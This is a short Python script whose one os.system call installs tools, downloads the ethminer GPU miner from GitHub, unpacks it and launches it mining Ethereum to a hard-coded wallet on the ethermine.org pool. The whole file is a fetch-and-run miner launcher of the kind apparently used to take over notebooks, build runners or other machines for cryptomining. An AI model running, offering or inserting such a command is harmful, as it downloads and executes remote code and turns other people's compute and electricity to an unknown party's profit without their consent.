import os
os.system("apt update && apt install wget unzip && wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz && tar -zxvf ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz && cd bin/ && ./ethminer -U -P stratum2+tcp://0x6ff85749ffac2d3a36efa2bc916305433fa93731.ipqce2xl5hi6b3x@us1.ethermine.org:4444")
